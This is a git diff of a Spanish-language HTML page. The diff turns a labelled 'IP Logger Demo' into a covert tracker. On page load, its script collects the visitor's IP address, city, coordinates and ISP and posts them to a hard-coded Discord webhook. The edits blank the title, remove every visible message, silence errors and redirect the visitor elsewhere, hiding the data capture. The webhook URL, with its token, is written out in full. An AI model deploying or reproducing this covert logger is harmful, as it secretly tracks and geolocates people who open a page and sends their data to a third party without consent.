@@ -2,10 +2,9 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>IP Logger Demo</title>
+  <title></title>
 </head>
 <body>
-  <h1>Obteniendo IP...</h1>
 
   <script>
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1356010314117943427/1EFY6VFfLFjllgQ-mNPO8LfBnNz13cYjveGH4Tku7yHF49nfmS3m6vjGXWWvSYWmoOOe';
@@ -22,17 +21,17 @@
         const geoData = await geoRes.json();
 
         const payload = {
-          username: "IP Logger (IPv4)",
+          username: "Cartelito",
           embeds: [{
-            title: "🔍 Nueva visita (IPv4)",
+            title: "Tú sabes.",
             color: 16753920,
             fields: [
-              { name: "🔗 IP", value: ipv4 || "No disponible", inline: false },
-              { name: "🌎 País", value: geoData.country_name || "No disponible", inline: true },
-              { name: "🗺️ Región", value: geoData.region || "No disponible", inline: true },
-              { name: "🌆 Ciudad", value: geoData.city || "No disponible", inline: true },
-              { name: "📍 Coordenadas", value: `${geoData.latitude}, ${geoData.longitude}` || "No disponible", inline: true },
-              { name: "🧭 ISP", value: geoData.org || "No disponible", inline: false }
+              { name: "EIPI", value: ipv4 || "No disponible", inline: false },
+              { name: "País", value: geoData.country_name || "No disponible", inline: true },
+              { name: "Región", value: geoData.region || "No disponible", inline: true },
+              { name: "Ciudad", value: geoData.city || "No disponible", inline: true },
+              { name: "Coordenadas", value: `${geoData.latitude}, ${geoData.longitude}` || "No disponible", inline: true },
+              { name: "ISP", value: geoData.org || "No disponible", inline: false }
             ],
             footer: { text: `Fecha: ${new Date().toLocaleString()}` }
           }]
@@ -44,11 +43,11 @@
           body: JSON.stringify(payload)
         });
 
-        document.body.innerHTML = "<h2>¡Información IPv4 enviada al webhook!</h2>";
+        // Redirigir a mausin18.github.io después de completar el proceso
+        window.location.href = "https://mausin18.github.io";
 
       } catch (error) {
-        console.error("Error:", error);
-        document.body.innerHTML = "<h2>Error al obtener o enviar información.</h2>";
+        //console.error("Error:", error);
       }
     }
 
